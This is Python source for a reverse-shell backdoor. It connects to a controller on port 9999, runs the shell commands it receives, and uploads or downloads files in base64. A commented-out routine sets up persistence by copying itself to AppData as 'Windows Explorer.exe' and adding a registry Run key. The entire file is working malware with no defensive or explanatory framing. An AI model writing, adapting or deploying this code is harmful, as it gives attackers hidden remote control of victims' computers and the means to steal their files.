import socket
import os
import subprocess
import json
import base64
import sys
#import shutil

# def become_persistent():
#     evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
#     if not os.path.exists(evil_file_location):
#         shutil.copyfile(sys.executable, evil_file_location)
#         subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v name /t REG_SZ /d "' + evil_file_location +'"',shell=True)

def reliable_send(data):
    global s
    json_data = json.dumps(data)
    s.send(str.encode(json_data))

def reliable_receive():
    global s
    json_data = ""
    while True:
        try:
            received_data = s.recv(1024).decode("utf-8")
            json_data = json_data + received_data
            return json.loads(json_data)
        except Exception:
            continue

def execute_system_command(command):
    result = subprocess.check_output(command, shell=True)
    return result.decode("utf-8")

def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Change working directory to " + path

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Upload Successful"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())

#become_persistent()
s = socket.socket()
host = "localhost"
port = 9999
s.connect((host, port))

try:
    while True:
        command = reliable_receive()
        try:
            if len(command) > 0:
                if command[0] == "exit":
                    s.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = read_file(command[1])
                elif command[0] == "upload":
                    command_result = write_file(command[1], command[2])
                else:
                    command_result = execute_system_command(command)
        except Exception as e:
            command_result = "[-] Error during command execution: " + str(e)
        currentWD = (os.getcwd() + "> ")
        reliable_send(command_result + currentWD)
except Exception as e:
    sys.exit("[-] Error: " + str(e))